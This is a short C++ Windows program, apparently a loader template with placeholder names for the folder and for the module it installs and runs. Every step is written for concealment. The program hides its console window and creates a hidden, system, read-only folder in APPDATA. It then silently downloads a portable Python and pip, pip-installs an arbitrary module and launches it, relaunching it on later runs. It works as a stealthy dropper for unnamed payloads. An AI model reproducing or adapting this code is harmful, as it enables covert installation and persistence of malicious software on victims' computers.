#include <iostream>
#include <windows.h>
#include <filesystem>
using namespace std;

void p(string t)
{
    const char *c = t.c_str();
    FILE *s = popen(c, "r");
    char b[1024];
    while (fgets(b, 1024, s))
    {
    }
    pclose(s);
}

int main()
{
    string r = "RANDOMFOLDER";
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    p("ADDON");
    filesystem::current_path(getenv("APPDATA"));
    if (filesystem::exists(r))
    {
        filesystem::current_path(r);
        p("python -m RUNMODULENAME ARGS");
    }
    else
    {
        filesystem::create_directory(r);
        p("attrib +h +s +r " + r);
        filesystem::current_path(r);
        p("curl -s https://www.python.org/ftp/python/3.12.1/python-3.12.1-embed-win32.zip -o PYTHONZIP & tar -xf PYTHONZIP & echo import site >> python312._pth & curl -s https://bootstrap.pypa.io/get-pip.py -O & python get-pip.py & Scripts\\pip install INSTALLMODULENAME & python -m RUNMODULENAME ARGS");
    }
    return 0;
}
